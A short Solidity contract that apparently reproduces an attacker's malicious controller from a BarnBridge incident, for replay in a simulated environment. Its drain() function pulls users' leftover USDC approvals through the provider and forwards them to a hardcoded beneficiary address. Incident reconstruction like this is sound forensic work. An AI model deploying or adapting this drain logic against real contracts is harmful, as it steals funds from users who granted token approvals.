// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IBBProvider {
    function _takeUnderlying(address, uint256) external;
    function transferFees() external;
}

/// Minimal stand-in for the attacker's malicious controller implementation, installed
/// behind the DAO-captured controller slot in the Playground (via codeOverrides). It
/// reproduces the observed on-chain behaviour: feesOwner() -> attacker, the provider's
/// cumulator hooks are no-ops, and drain() batch-pulls every residual USDC approval then
/// forwards the pile via transferFees(). BENEFICIARY is a constant so the deployed
/// runtime bytecode is deterministic for the code override.
contract BarnBridgeMaliciousController {
    address constant BENEFICIARY = 0xF908610E9174c7cd6e9dfD371e238be4511297A1;

    function feesOwner() external pure returns (address) { return BENEFICIARY; }
    function _beforeCTokenBalanceChange() external {}
    function _afterCTokenBalanceChange(uint256) external {}
    function upgradeTo(address) external {} // no-op: the proxy address already runs this code

    function drain(address provider, address[] calldata users, uint256[] calldata amounts) external {
        for (uint256 i = 0; i < users.length; i++) {
            if (amounts[i] != 0) {
                IBBProvider(provider)._takeUnderlying(users[i], amounts[i]);
            }
        }
        IBBProvider(provider).transferFees();
    }
}
